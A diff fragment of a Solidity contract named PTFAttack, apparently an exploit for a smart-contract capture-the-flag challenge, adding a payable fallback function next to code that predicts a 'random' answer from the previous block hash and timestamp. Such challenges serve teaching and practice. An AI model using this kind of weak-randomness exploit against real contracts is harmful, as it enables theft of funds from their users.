@@ -50,6 +50,8 @@ contract PTFAttack {
         challenge.lockInGuess.value(msg.value)(n);
     }
 
+    function() external payable {}
+
     function guess(uint8 n) public payable {
         uint8 answer = uint8(
             keccak256(block.blockhash(block.number - 1), now)
